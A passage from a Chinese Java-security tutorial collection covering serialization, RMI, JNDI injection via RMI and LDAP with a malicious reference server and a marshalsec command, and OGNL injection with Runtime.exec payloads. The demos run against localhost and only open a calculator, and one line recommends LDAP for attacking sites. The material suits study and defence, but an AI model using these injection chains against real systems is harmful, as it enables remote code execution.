ByteArrayInputStream(byteArrayOutputStream.toByteArray()); ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream); SerializeDemo serializeDemo1 = (SerializeDemo)objectInputStream.readObject(); objectInputStream.close(); serializeDemo1.add(1,2); } } class SerializeDemo implements Serializable { // 必须要实现Serializable这个接口，可以不用里面的方法 public int x; public int add(int a,int b){ return a+b+x; } } /* [-84, -19, 0, 5, 115, 114, 0, 25, 111, 114, 103, 46, 101, 120, 97, 109, 112, 108, 101, 46, 83, 101, 114, 105, 97, 108, 105, 122, 101, 68, 101, 109, 111, -89, 103, -99, 60, 6, -29, 97, -91, 2, 0, 1, 73, 0, 1, 120, 120, 112, 0, 0, 2, -102] 669 */ 序列化特征 十六进制查看我们生成的123.ser # hexdump没有xxd直观 xxd 123.ser xxd显示的结果，中间那一栏是文件的十六进制显示，最右边是字符显示。这里需要注意的特征值就是16进制显示时的前32位： AC ED：STREAM_MAGIC，声明使用了序列化协议，从这里可以判断保存的内容是否为序列化数据。 （这是在黑盒挖掘反序列化漏洞很重要的一个点） 00 05：STREAM_VERSION，序列化协议版本。 安全性 因为Java的序列化机制可以导致一个实例能直接从byte[]数组创建，而不经过构造方法，因此，它存在一定的安全隐患。一个精心构造的byte[]数组被反序列化后可以执行特定的Java代码，从而导致严重的安全漏洞。 实际上，Java本身提供的基于对象的序列化和反序列化机制既存在安全性问题，也存在兼容性问题。更好的序列化方法是通过JSON这样的通用数据结构来实现，只输出基本类型（包括String）的内容，而不存储任何与代码相关的信息。 反序列化漏洞的攻击流程 客户端构造payload(有效载荷)，并进行一层层的封装，完成最后的exp（exploit-利用代码） exp发送到服务端，进入一个服务端自主重写（也可能是也有组件重写）的readobject函数，它会反序列化恢复我们构造的exp去形成一个恶意的数据格式exp_1（剥去第一层） 这个恶意数据exp_1在接下来的处理流程(可能是在自主重写的readobject中、也可能是在外面的逻辑中)，会执行一个exp_1这个恶意数据类的一个方法，在方法中会根据exp_1的内容进行函处理，从而一层层地剥去（或者说变形、解析）我们exp_1变成exp_2、exp_3...... 最后在一个可执行任意命令的函数中执行最后的payload，完成远程代码执行。 那么以上大概可以分成三个主要部分： payload：需要让服务端执行的语句：比如说弹计算器还是执行远程访问等； 反序列化利用链：服务端中存在的反序列化利用链，会一层层拨开我们的exp，最后执行payload。(如commons-collections利用链) 重写readObject：服务端中存在的可以与我们漏洞链相接的并且可以从外部访问的readObject函数重写点 漏洞挖掘 java是支持自定义readObject与writeObject方法的，只要某个类中按照特定的要求实现了readObject方法，那么在反序列化的时候就会自动调用它，如果这个自定义的readObject方法里进行了一些危险操作，那么就会导致反序列化漏洞的发生了。 举例如下： 可以看到自定义的readObject的确执行了，不过真实的应用中危险操作比较隐蔽。 需要注意的是，实现 readObject/writeObject 方法一定需要private 私有化，否则会找不到自定义的方法，从而使用ObjectOutputStream中的readObject方法 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 15:12:15 Author: aaron Url: https://byaaronluo.github.io/知识库/02.JAVA安全/04.Java序列化与反序列化.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/02.JAVA安全/05.RMI基础.html":{"url":"知识库/02.JAVA安全/05.RMI基础.html","title":"05.RMI基础","keywords":"","body":" RMI概述 RMI实现机制 RMI实现举例 实现过程 实现举例 HelloInterface.java HelloImpl.java Server.java Client.java 注意事项 参考文章 RMI概述 RMI: 远程方法调用(Remote Method Invocation)，它支持存储于不同地址空间的程序级对象之间彼此进行通信，实现远程对象之间的无缝远程调用。 Java RMI：用于不同虚拟机之间的通信，这些虚拟机可以在不同的主机上、也可以在同一个主机上；一个虚拟机中的对象调用另一个虚拟机中的对象的方法（一个JVM中的代码可以通过网络实现远程调用另一个JVM的某个方法。），只不过是允许被远程调用的对象要通过一些标志加以标识。 提供服务的一方我们称之为服务器，而实现远程调用的一方我们称之为客户端。 具体实现方法： 远程服务器提供具体的类和方法，本地会通过某种方式获得远程类的一个代理，然后通过这个代理调用远程对象的方法，方法的参数是通过序列化与反序列化的方式传递的，所以： 只要服务端的对象提供了一个方法，这个方法接收的是一个Object类型的参数， 且远程服务器的classpath中存在可利用pop链，那么我们就可以通过在客户端调用这个方法，并传递一个精心构造的对象的方式来攻击rmi服务。 RMI实现机制 要实现RMI，服务器和客户端必须共享同一个接口。Java的RMI规定此接口必须派生自java.rmi.Remote，并在每个方法声明抛出RemoteException。 上面说了本地会通过某种方式获得远程对象的代理，那么具体是怎么的实现机制呢？RMI模式中除了有Client与Server，还借助了一个Registry(注册中心)。 因此，RMI由3个部分构成 第一个是rmiregistry（JDK提供的一个可以独立运行的程序，在bin目录下） 第二个是server端的程序，对外提供远程对象 第三个是client端的程序，想要调用远程对象的方法。 | Server | Registry | Client | | :---: | :---: | :---: | | 提供具体的远程对象 | 一个注册表，存放着远程对象的位置（ip、端口、标识符） | 远程对象的使用者 | 其中Server与Registry可以在同一服务器上实现，也可以布置在不同服务器上，现在一个完整的RMI流程可以大概描述为： 启动Registry服务，启动时可以指定服务监听的端口，也可以使用默认的端口（1099）。 Server端在本地先实例化一个提供服务的实现类，然后通过RMI提供的 Naming/Context/Registry（下面实例用的Registry）等类的bind或rebind方法将刚才实例化好的实现类注册到RMI Registry上并对外暴露一个名称。 Client端通过本地的接口和一个已知的名称（即RMI Registry暴露出的名称）再使用RMI提供的Naming/Context/Registry等类的lookup方法从RMI Server那拿到实现类。这样虽然本地没有这个类的实现类，但所有的方法都在接口里了，便可以实现远程调用对象的方法了。 RMI的交互图： PS： 图中的stub就是客户端代理，skeleton就是服务端代理 远程方法调用的通信模式： RMI实现举例 实现过程 大概实现过程 定义远程接口 服务端实现远程接口 服务端注册远程对象 客户端调用接口 实现举例 HelloInterface.java // 定义一个远程接口 package com.company; import java.rmi.Remote; import java.rmi.RemoteException; public interface HelloInterface extends Remote { // 创建接口，必须继承Remote String say (String name) throws RemoteException; // 每个函数必须要抛出 RemoteException 异常 } HelloImpl.java // 实现远程接口 package com.company; import java.rmi.RemoteException; import java.rmi.server.UnicastRemoteObject; // 必须要这个，不然会报序列化的错 public class HelloImpl extends UnicastRemoteObject implements HelloInterface { public HelloImpl() throws RemoteException { // 必须要这个 super(); } @Override public String say(String name) throws RemoteException { // 实现刚才定义的接口的方法 return \"test \" + name; } } Server.java // 创建一个注册表，并注册远程对象 package com.company; import java.net.MalformedURLException; import java.rmi.AlreadyBoundException; import java.rmi.Naming; import java.rmi.RemoteException; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; //注册远程对象 public class Server { public static void main(String[] args) throws RemoteException, AlreadyBoundException, MalformedURLException { HelloInterface helloService = new HelloImpl(); LocateRegistry.createRegistry(1099); // 创建 System.setProperty(\"java.rmi.server.hostname\",\"127.0.0.1\"); // 绑定IP，默认是 127.0.0.1 Registry registry = LocateRegistry.getRegistry(); // 获取实例 registry.bind(\"test\",helloService); // 注册远程对象 //Naming.bind(\"test\",helloService); // 上面2行可以用这个替换 } } Client.java // 查找远程调用方法，并且调用远程方法 package com.company; import java.net.MalformedURLException; import java.rmi.Naming; import java.rmi.NotBoundException; import java.rmi.RemoteException; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; public class Client { public static void main( String[] args ) throws RemoteException, NotBoundException, MalformedURLException { // HelloInterface hello = (HelloInterface) Naming.lookup(\"rmi://127.0.0.1:1099/test\"); // 写法都可 Registry registry = LocateRegistry.getRegistry(\"127.0.0.1\", 1099); HelloInterface hello = (HelloInterface) registry.lookup(\"test\"); System.out.println(hello.says(\"123123\")); } } 注意事项 接口需要继承Remote接口，且方法需要抛出RemoteException错误 接口的实现类需要继承UnicastRemoteObject，同样的方法需要抛出RemoteException错误 如果远程方法需要传参，需要保证参数是可序列化的，我这里传参只是传了字符串，字符串是可序列化的，如果传参是自定义的对象，那么这个对象需要实现Serilizable接口 如果服务端与客户端不在同一主机，需要保证调用的远程对象实现的远程接口在客户端与服务端都存在 参考文章 https://www.jianshu.com/p/5c6f2b6d458a https://blog.csdn.net/qq_28081453/article/details/83279066 https://www.cnblogs.com/fanghao/p/8918953.html https://www.liaoxuefeng.com/wiki/1252599548343744/1323711850348577 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 15:53:30 Author: aaron Url: https://byaaronluo.github.io/知识库/02.JAVA安全/05.RMI基础.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/02.JAVA安全/06.JNDI注入原理及利用.html":{"url":"知识库/02.JAVA安全/06.JNDI注入原理及利用.html","title":"06.JNDI注入原理及利用","keywords":"","body":" 介绍 结构 JNDI注入 执行方式 利用过程 结果 攻击链分析 RMI 环境 分析 InitialContext.java GenericURLContext.java RegistryContext.java NamingManager.java LDAP 环境 LdapClient.java Server 使用 marshalsec-0.0.3-SNAPSHOT-all.jar 启动一个ldap服务 ExecTest.java 分析 总结 RMI LDAP https://xz.aliyun.com/t/6633 介绍 JNDI (Java Naming and Directory Interface) ，包括Naming Service和Directory Service。JNDI是Java API，允许客户端通过名称发现和查找数据、对象。这些对象可以存储在不同的命名或目录服务中,就像人的名字或DNS中的域名与IP的关系。 结构 JNDI由JNDI API、命名管理、JNDI SPI（service provider interface）服务提供的接口。我们的应用可以通过JNDI的API去访问相关服务提供的接口 JDNI的服务是可以拓展的，可以从JNDI页面下载其他服务提供商，也可以从远程获得其他服务提供商 JDK包括以下命名/目录服务的服务： 轻型目录访问协议（ldap） 通用对象请求代理体系结构（CORBA），通用对象服务（COS）名称服务 Java远程方法调用（RMI）注册表 域名服务（DNS） Java命名和目录接口（JNDI）是一种Java API，类似于一个索引中心，它允许客户端通过name发现和查找数据和对象。 其应用场景比如：动态加载数据库配置文件，从而保持数据库代码不变动等 代码格式如下： String jndiName = \"\"; Context context = new InitiaContext(); DataSource ds = (DataSource) context.lookup(jndiName) 这些对象可以存储在不同的命名或目录服务中，例如远程方法调用（RMI），通用对象请求代理体系结构（CORBA），轻型目录访问协议（LDAP）或域名服务（DNS）。 JNDI注入 JNDI 注入其实就是当上下文中jndiName 这个变量可控的情况下，引发的漏洞，可将远程class文件加载，从而导致远程代码执行（RCE） 测试环境：jdk8u181 // client.java package JNDIInject; import javax.naming.Context; import javax.naming.InitialContext; public class Client { public static void main(String[] args) throws Exception { System.setProperty(\"com.sun.jndi.rmi.object.trustURLCodebase\", \"true\"); String uri = \"rmi://127.0.0.1:1099/aa\"; Context context = new InitialContext(); context.lookup(uri); } } // server package JNDIInject; import com.sun.jndi.rmi.registry.ReferenceWrapper; import javax.naming.Reference; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; public class Server { public static void main(String[] args) throws Exception { Registry registry = LocateRegistry.createRegistry(1099); Reference aa = new Reference(\"ExecTest\", \"ExecTest\", \"http://127.0.0.1:8081/\"); ReferenceWrapper refObjWrapper = new ReferenceWrapper(aa); System.out.println(\"Binding 'refObjWrapper' to 'rmi://127.0.0.1:1099/aa'\"); registry.bind(\"aa\", refObjWrapper); } } 注意，在服务端代码绑定aa的时候，地址后面一定要加上/ 如果不加上/，那么则向web服务请求恶意字节码的时候，则会找不到该字节码 正确请求如下： //Exec.java public class ExecTest { public ExecTest() throws Exception { System.out.println(\"123\"); } } 执行方式 首先使用jdk8u181 编译ExecTest # jdk 8u181 javac ExecTest.java 然后使用python 启动一个web服务，ExecTest.class 要可访问 利用过程 攻击者提供恶意的rmi注册中心 JNDI 去恶意的rmi注册中心查询aa类 恶意服务器再返回ExecTest.class 字节码文件给客户端 client 再执行ExecTest.class 字节码 结果 此处客户端有一句 System.setProperty(\"com.sun.jndi.rmi.object.trustURLCodebase\", \"true\"); jdk = 8u181 , 这里是存在trustCodebaseURL的限制，只信任已有的codebase地址，不能从指定codebase下载字节码 攻击链分析 RMI 环境 jdk8u181 分析 在Client.java 的lookup处打上断点,开始分析, 首先进入context.lookup()的lookup处 InitialContext.java // InitialContext.java public Object lookup(String name) throws NamingException { //getURLOrDefaultInitCtx函数会分析name的协议头返回对应协议的环境对象，此处返回Context对象的子类rmiURLContext对象 //然后在对应协议中去lookup搜索，我们进入lookup函数 return getURLOrDefaultInitCtx(name).lookup(name); } GenericURLContext.java // GenericURLContext.class // var1 = rmi://127.0.0.1:1099/aa public Object lookup(String var1) throws NamingException { //此处this为rmiURLContext类调用对应类的getRootURLContext类为解析RMI地址 //不同协议调用这个函数，根据之前getURLOrDefaultInitCtx(name)返回对象的类型不同，执行不同的getRootURLContext //进入不同的协议路线 // 获取rmi注册中心的相关数据 ResolveResult var2 = this.getRootURLContext(var1, this.myEnv); // 获取注册中心对象 Context var3 = (Context)var2.getResolvedObj(); Object var4; try { // 去注册中心lookup，进入此处 lookup var4 = var3.lookup(var2.getRemainingName()); } finally { var3.close(); } return var4; } RegistryContext.java // RegistryContext.class public Object lookup(Name var1) throws NamingException { if (var1.isEmpty()) { return new RegistryContext(this); } else { // var1 = aa，进入else语句 Remote var2; try { var2 = this.registry.lookup(var1.get(0)); // RMI 客户端与注册中心通信，返回RMI服务IP，地址等信息 } catch (NotBoundException var4) { throw new NameNotFoundException(var1.get(0)); } catch (RemoteException var5) { throw (NamingException)wrapRemoteException(var5).fillInStackTrace(); } return this.decodeObject(var2, var1.getPrefix(1)); // 进入此处decodeObject() } } private Object decodeObject(Remote var1, Name var2) throws NamingException { try { // Reference 对象会进行连接，获取远程class文件地址 Object var3 = var1 instanceof RemoteReference ? ((RemoteReference)var1).getReference() : var1; Reference var8 = null; if (var3 instanceof Reference) { var8 = (Reference)var3; } else if (var3 instanceof Referenceable) { var8 = ((Referenceable)((Referenceable)var3)).getReference(); } if (var8 != null && var8.getFactoryClassLocation() != null && !trustURLCodebase) { throw new ConfigurationException(\"The object factory is untrusted. Set the system property 'com.sun.jndi.rmi.object.trustURLCodebase' to 'true'.\"); } else { // 获取 Reference 对象，进入此处getObjectInstance return NamingManager.getObjectInstance(var3, var2, this, this.environment); } } catch (NamingException var5) { throw var5; } catch (RemoteException var6) { throw (NamingException)wrapRemoteException(var6).fillInStackTrace(); } catch (Exception var7) { NamingException var4 = new NamingException(); var4.setRootCause(var7); throw var4; } } NamingManager.java 在这里看到了熟悉的newInstance()，实例化，想想写的ExecTest.java 只有一个构造函数，实例化之后，就会执行构造函数中的恶意代码 继续向下看，走到loadClass函数时，就会向工厂请求ExecTest.class 最后在这里实例化ExecTest，执行构造函数的Runtime.getRuntime.exec(),弹出计算器 可以发现命令执行完成了，但是出现了报错，我们可以更换一个命令执行点，在factor.getObjectInstance复写该函数执行命令。 报错原因是因为我们的类在实例化之后不能转换成ObjectFactor (ObjectFactor) clas.newInstance()，只需要我们的类实现该接口即可； // ExecTest.java import javax.naming.Context; import javax.naming.Name; import javax.naming.spi.ObjectFactory; import java.util.Hashtable; public class ExecTest implements ObjectFactory { public ExecTest() throws Exception { System.out.println(\"123\"); } @Override public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable environment) throws Exception { return null; } } LDAP LDAP（Lightweight Directory Access Protocol）-轻量目录访问协议。但看了这个解释等于没说，其实也就是一个数据库，可以把它与mysql对比！ 具有以下特点： 基于TCP/IP协议 同样也是分成服务端/客户端；同样也是服务端存储数据，客户端与服务端连接进行操作 相对于mysql的表型存储；不同的是LDAP使用树型存储 因为树型存储，读性能佳，写性能差，没有事务处理、回滚功能 树层次分为以下几层： dn：一条记录的详细位置，由以下几种属性组成 dc: 一条记录所属区域（哪一个树，相当于MYSQL的数据库） ou：一条记录所处的分叉（哪一个分支，支持多个ou，代表分支后的分支） cn/uid：一条记录的名字/ID（树的叶节点的编号，想到与MYSQL的表主键？） 举个例子一条记录就是 dn=\"uid=aaron.luo,ou=oa,dc=example,dc=com\" 其实利用方法是没差的，我们之前分析的时候也可以看到代码会根据传入协议头的区别去进入对应的处理函数，只需要修改传入参数的解析头,再启动ldap服务，恶意class的web服务即可 环境 jdk8u121(windows) LdapClient.java //ldapClient.java import javax.naming.Context; import javax.naming.InitialContext; public class LdapClient { public static void main(String[] args) throws Exception{ String uri = \"ldap://127.0.0.1:1389/aa\"; Context ctx = new InitialContext(); ctx.lookup(uri); } } Server 使用 marshalsec-0.0.3-SNAPSHOT-all.jar 启动一个ldap服务 java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8081/#ExecTest ExecTest.java import javax.naming.Context; import javax.naming.Name; import javax.naming.directory.Attributes; import javax.naming.spi.DirObjectFactory; import java.util.Hashtable; public class ExecTest implements DirObjectFactory { public ExecTest() throws Exception{ Runtime.getRuntime().exec(\"calc.exe\"); } @Override public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable environment, Attributes attrs) throws Exception { return null; } @Override public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable environment) throws Exception { return null; } } 分析 分析同rmi，在客户端处强制进入lookup 在initialContext.java 中，继续进入lookup，其中name 为传入的uri 在ldapURLContext.java 中，uri 就是 var1，继续lookup，进入lookup GenericURLContext.java 中getRootURLContext 在找协议，以及需要寻找的指定类，继续进入lookup partialConpositeContext.java中，this指代上下文中解析ldap的地址，然后再去寻找ldap结构，进入p_lookup() ComponentContext.java, 传入aa类，再进入c_lookup寻找 LdapCtx.java, 在这里才把codebase找到，以及对应的key值foo，恶意factor ExecTest ，继续跟进 到722行，在这里将var3，var1传入，var3对象包含了className，classFactor，classFactorLocation，这里ldap已经将恶意类信息返回给客户端了，客户端此时则需要向恶意web服务请求字节码，并完成实例化，即可执行恶意类中的命令执行函数，此时我们进入getObjectInstance() DirectorManager.java，看到这里，是不是很熟悉，如果忘记了，请看上面rmi的详解，在这里我们继续进入getObjectFactoryFromReference() NamingManger.java，在这里，我们看到已经请求web服务，获取到字节码了，到clas.newInstance() 这里，就能执行恶意字节码中的恶意代码了 总结 通过分析，我们发现在使用ldap，没有codebase的限制，而rmi在我windows jdk8u121处都有codebase的限制，所以我们在日站的时候最好是使用ldap来进行注入 粘贴一些前人总结的限制吧 RMI JDNI注入由于其加载动态类原理是JNDI Reference远程加载Object Factory类的特性（使用的不是RMI Class Loading,而是URLClassLoader）。 所以不受RMI动态加载恶意类的 java版本应低于7u21、6u45，或者需要设置java.rmi.server.useCodebaseOnly=false系统属性的限制。具有更多的利用空间 但是我们之前实验还是有版本无法复现，是因为在JDK 6u132, JDK 7u122, JDK 8u113版本中，系统属性 com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase 的默认值变为false，即默认不允许从远程的Codebase加载Reference工厂类 LDAP 在2018年10月，Java最终也修复了这个利用点，对LDAP Reference远程工厂类的加载增加了限制， 在Oracle JDK 11.0.1、8u191、7u201、6u211之后 com.sun.jndi.ldap.object.trustURLCodebase 属性的默认值被调整为false Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 15:51:58 Author: aaron Url: https://byaaronluo.github.io/知识库/02.JAVA安全/06.JNDI注入原理及利用.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/02.JAVA安全/07.OGNL表达式.html":{"url":"知识库/02.JAVA安全/07.OGNL表达式.html","title":"07.OGNL表达式","keywords":"","body":" 介绍 三要素 使用OGNL表达式 pom.xml 基础用法举例 对Root对象的访问 对上下文对象的访问 对静态变量的访问‼️ 方法的调用‼️ 对数组和集合的访问 投影与选择 创建对象‼️ 和 % 和 $ 的区别 #符 %符 $符 和 . 和 @ 的区别 OGNL表达式注入 注入举例 能解析OGNL的API HTTP请求中常见的注入点 常用payload 参考 介绍 OGNL 是 Object-Graph Navigation Language（对象导航图语言）的缩写，它是一种功能强大的表达式语言，通过它简单一致的表达式语法，可以存取对象的任意属性，调用对象的方法，遍历整个对象的结构图，实现字段类型转化等功能。它使用相同的表达式去存取对象的属性。这样可以更好的取得数据。 Ognl 是一个功能强大的表达式语言，用来获取和设置 java 对象的属性 ，它旨在提供一个更高抽象度语法来对 java 对象图进行导航。 官方文档：https://commons.apache.org/proper/commons-ognl/language-guide.html 对于开发者来说，使用 OGNL，可以用简洁的语法来完成对 java 对象的导航。通常来说：通过一个 “路径” 来完成对象信息的导航，这个 “路径” 可以是到 java bean 的某个属性，或者集合中的某个索引的对象，等等，而不是直接使用 get 或者 set 方法来完成。 三要素 首先来介绍下 OGNL 的三要素： 表达式（Expression）： 表达式是整个 OGNL 的核心内容，所有的 OGNL 操作都是针对表达式解析后进行的。通过表达式来告诉 OGNL 操作到底要干些什么。因此，表达式其实是一个带有语法含义的字符串，整个字符串将规定操作的类型和内容。OGNL 表达式支持大量的表达式，如 “链式访问对象”、表达式计算、甚至还支持 Lambda 表达式。 Root 对象： OGNL 的 Root 对象可以理解为 OGNL 的操作对象。当我们指定了一个表达式的时候，我们需要指定这个表达式针对的是哪个具体的对象。而这个具体的对象就是 Root 对象，这就意味着，如果有一个 OGNL 表达式，那么我们需要针对 Root 对象来进行 OGNL 表达式的计算并且返回结果。 上下文环境： 有个 Root 对象和表达式，我们就可以使用 OGNL 进行简单的操作了，如对 Root 对象的赋值与取值操作。但是，实际上在 OGNL 的内部，所有的操作都会在一个特定的数据环境中运行。这个数据环境就是上下文环境（Context）。OGNL 的上下文环境是一个 Map 结构，称之为 OgnlContext。Root 对象也会被添加到上下文环境当中去。 说白了上下文就是一个 MAP 结构，它实现了 java.utils.Map 的接口。 使用OGNL表达式 pom.xml ognl ognl 3.1.11 基础用法举例 对Root对象的访问 OGNL 使用的是一种链式的风格进行对象的访问，中间使用.进行连接；所有的OGNL表达式都基于当前对象的上下文来完成求值运算，链的前面部分的结果将作为后面求值的上下文。 package org.example; import lombok.Data; import ognl.Ognl; import ognl.OgnlException; public class OgnlTest { public static void main(String[] args) throws OgnlException { User user = new User(); user.setAge(16); user.setName(\"hello\"); Info info = new Info(\"1\",\"2\"); user.setInfo(info); System.out.println(Ognl.getValue(\"age\", user)); // 16 System.out.println(Ognl.getValue(\"name\", user)); // hello System.out.println(Ognl.getValue(\"name.length\", user)); // 5 System.out.println(Ognl.getValue(\"info\", user)); // Info(a=1, b=2) System.out.println(Ognl.getValue(\"info.a\", user)); // 1 } } @Data class User { private String name; private int age; private Info info; } @Data class Info { private String a; private String b; public Info(String a, String b){ this.a = a; this.b = b; } } 对上下文对象的访问 使用 OGNL 的时候如果不设置上下文对象，系统会自动创建一个上下文对象，如果传入的参数当中包含了上下文对象则会使用传入的上下文对象。 当访问上下文环境当中的参数时候，需要在表达式前面加上 '#' ，表示了与访问 Root 对象的区别。 package org.example; import lombok.Data; import ognl.Ognl; import ognl.OgnlException; import java.util.HashMap; import java.util.Map; public class OgnlTest { public static void main(String[] args) throws OgnlException { User user = new User(); user.setAge(16); user.setName(\"hello\"); Info info = new Info(\"1\",\"2\"); user.setInfo(info); Map context = new HashMap(); context.put(\"test\", \"testValue\"); context.put(\"aaa\", user); System.out.println(Ognl.getValue(\"#test\", context, user)); // testValue System.out.println(Ognl.getValue(\"#aaa\", context, user)); // User(name=hello, age=16, info=Info(a=1, b=2)) System.out.println(Ognl.getValue(\"#aaa.name\", context, user)); // hello } } @Data class User { private String name; private int age; private Info info; } @Data class Info { private String a; private String b; public Info(String a, String b){ this.a = a; this.b = b; } } 对静态变量的访问‼️ 在 OGNL 表达式当中也可以访问静态变量或者调用静态方法，格式如 @[class]@[field/method()]。 package org.example; import ognl.Ognl; import ognl.OgnlException; public class OgnlTest { public static String test = \"66666\"; public static void main(String[] args) throws OgnlException { System.out.println(Ognl.getValue(\"@org.example.OgnlTest@test\", null)); } } 方法的调用‼️ 如果需要调用 Root 对象或者上下文对象当中的方法也可以使用类似的方式来调用。甚至可以传入参数。 赋值的时候可以选择上下文当中的元素进行给 Root 对象的 name 属性赋值。 package org.example; import lombok.Data; import ognl.Ognl; import ognl.OgnlException; import java.util.HashMap; import java.util.Map; public class OgnlTest { public static void main(String[] args) throws OgnlException { User user = new User(); Map context = new HashMap(); context.put(\"test\", \"testValue\"); context.put(\"aaa\", user); System.out.println(Ognl.getValue(\"getName()\", context, user)); // null Ognl.getValue(\"setName(#test)\", context, user); // 执行setName方法 System.out.println(Ognl.getValue(\"getName()\", context, user)); // testValue } } @Data class User { private String name; private int age; } 对数组和集合的访问 OGNL 支持对数组按照数组下标的顺序进行访问。此方式也适用于对集合的访问，对于 Map 支持使用键进行访问。 package org.example; import ognl.Ognl; import ognl.OgnlException; import java.util.ArrayList; import java.util.HashMap; import java.util.List; import java.util.Map; public class OgnlTest { public static void main(String[] args) throws OgnlException { List list = new ArrayList<>(); list.add(\"123\"); list.add(\"456\"); Map map = new HashMap(); map.put(\"test1\", \"value1\"); Map context = new HashMap(); context.put(\"list\", list); context.put(\"map\", map); System.out.println(Ognl.getValue(\"#list[0]\", context, list)); // 123 System.out.println(Ognl.getValue(\"#map['test1']\", context, map)); // value1 } } 投影与选择 OGNL 支持类似数据库当中的选择与投影功能。 个人感觉有点类似stream 投影：选出集合当中的相同属性组合成一个新的集合。语法为 collection.{XXX}，XXX 就是集合中每个元素的公共属性。 选择：选择就是选择出集合当中符合条件的元素组合成新的集合。语法为 collection.{Y XXX}，其中 Y 是一个选择操作符，XXX 是选择用的逻辑表达式。 选择操作符有 3 种： ? ：选择满足条件的所有元素 ^：选择满足条件的第一个元素 $：选择满足条件的最后一个元素 package org.example; import lombok.Data; import ognl.Ognl; import ognl.OgnlException; import java.util.ArrayList; import java.util.HashMap; import java.util.Map; public class OgnlTest { public static void main(String[] args) throws OgnlException { User u1 = new User(\"name1\", 11); User u2 = new User(\"name2\", 22); User u3 = new User(\"name3\", 33); User u4 = new User(\"name4\", 44); ArrayList list = new ArrayList(); list.add(u1); list.add(u2); list.add(u3); list.add(u4); Map context = new HashMap(); context.put(\"list\", list); System.out.println(Ognl.getValue(\"#list.{age}\", context, list)); // [11, 22, 33, 44] System.out.println(Ognl.getValue(\"#list.{? #this.age > 22}\", context, list)); // [User(name=name3, age=33), User(name=name4, age=44)] System.out.println(Ognl.getValue(\"#list.{^ #this.age > 22}\", context, list)); // [User(name=name3, age=33)] System.out.println(Ognl.getValue(\"#list.{$ #this.age > 22}\", context, list)); // [User(name=name4, age=44)] } } @Data class User { private String name; private int age; public User(String name, int age) { this.name = name; this.age = age; } } 创建对象‼️ OGNL 支持直接使用表达式来创建对象。主要有三种情况： 构造 List 对象：使用 {}, 中间使用 ',' 进行分割如 {\"aa\", \"bb\", \"cc\"} 构造 Map 对象：使用 #{}，中间使用 ', 进行分割键值对，键值对使用 ':' 区分，如 #{\"key1\" : \"value1\", \"key2\" : \"value2\"} 构造任意对象：直接使用已知的对象的构造方法进行构造。 System.out.println(Ognl.getValue(\"{'key1','value1'}\", null)); // [key1, value1] System.out.println(Ognl.getValue(\"#{'key1':'value1'}\", null)); // {key1=value1} System.out.println(Ognl.getValue(\"new java.lang.String('123')\", null)); // 123 # 和 % 和 $ 的区别 #符 #符主要有三种用途： 访问非根对象属性，即访问OGNL上下文和Action上下文，由于Struts2中值栈被视为根对象，所以访问其他非根对象时需要加#前缀，#相当于ActionContext.getContext()； 用于过滤和投影（projecting）集合，如books.{? #this.price； 用于构造Map，如#{'foo1':'bar1', 'foo2':'bar2'}； %符 %符的用途是在标志的属性为字符串类型时，告诉执行环境%{}里的是OGNL表达式并计算表达式的值。 $符 $符的主要作用是在相关配置文件中引入OGNL表达式，让其在配置文件中也能解析OGNL表达式。（换句话说，$用于在配置文件中获取ValueStack的值用的）。 # 和 . 和 @ 的区别 获取静态函数和变量的时候用@ 获取非静态函数用.号获取 获取非静态变量用#获取 OGNL表达式注入 webwork2和现在的Struts2.x中使用OGNL取代原来的EL来做界面数据绑定，所谓界面数据绑定，也就是把界面元素（例如一个textfield,hidden)和对象层某个类的某个属性绑定在一起，修改和显示自动同步。而Struts2框架正是因为滥用OGNL表达式，使之成为了“漏洞之王”。 由前面知道，OGNL可以访问静态方法、属性以及对象方法等，其中包含可以执行恶意操作如命令执行的类java.lang.Runtime等，当OGNL表达式外部可控时，攻击者就可以构造恶意的OGNL表达式来让程序执行恶意操作，这就是OGNL表达式注入漏洞。 注入举例 格式@[class]@[field/method()] package org.example; import ognl.Ognl; import ognl.OgnlException; public class OgnlTest { public static void main(String[] args) throws OgnlException { // @[class]@[field/method()] String payload = \"@java.lang.Runtime@getRuntime().exec('open -na Calculator')\"; System.out.println(Ognl.getValue(payload, null)); } } 能解析OGNL的API 能解析OGNL的API如下表： 类名 方法名 com.opensymphony.xwork2.util.TextParseUtil translateVariables,translateVariablesCollection com.opensymphony.xwork2.util.TextParser evaluate com.opensymphony.xwork2.util.OgnlTextParser evaluate com.opensymphony.xwork2.ognl.OgnlUtil setProperties,setProperty,setValue,getValue,callMethod,compile com.opensymphony.xwork2.util.ValueStack findString,findValue,setValue,setParameter com.opensymphony.xwork2.ognl.OgnlValueStack findString,findValue,setValue,setParameter,trySetValue org.apache.struts2.util.VelocityStrutsUtil evaluate org.apache.struts2.util.StrutsUtil isTrue,findString,findValue,getText,translateVariables,makeSelectList org.apache.struts2.views.jsp.ui.OgnlTool findValue ognl.Ognl parseExpression,getValue,setValue 以下是调用过程中可能会涉及到的一些类： 涉及类名 方法名 com.opensymphony.xwork2.ognl.OgnlReflectionProvider getGetMethod,getSetMethod,getField,setProperties,setProperty,getValue,setValue com.opensymphony.xwork2.util.reflection.ReflectionProvider getGetMethod,getSetMethod,getField,setProperties,setProperty,getValue,setValue HTTP请求中常见的注入点 常用payload //获取context里面的变量值 #user #user.name //使用runtime执行系统命令 @java.lang.Runtime@getRuntime().exec(\"calc\") //使用processbuilder执行系统命令 (new java.lang.ProcessBuilder(new 